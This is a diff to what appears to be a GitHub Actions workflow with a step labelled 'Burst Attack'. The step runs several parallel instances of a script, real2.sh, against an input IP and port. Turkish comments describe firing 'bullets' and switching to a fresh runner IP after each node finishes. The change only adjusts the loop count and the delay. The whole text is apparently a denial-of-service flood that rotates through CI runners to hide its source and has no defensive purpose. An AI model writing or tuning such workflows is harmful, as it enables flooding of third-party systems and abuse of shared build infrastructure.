@@ -30,10 +30,10 @@ jobs:
       - name: Burst Attack
         run: |
           # 10 saniye boyunca 8 koldan mermi basıyoruz
-          for i in {1..35}; do
+          for i in {1..5}; do
              sudo timeout 60 bash real2.sh ${{ inputs.ip }} ${{ inputs.port }}  &
           done
           
           # Makine 12 saniye sonra kapanacak, sıradaki taze IP gelecek
-          sleep 20
+          sleep 13
           echo "Node ${{ matrix.node }} bitti, yeni IP'ye geçiliyor..."
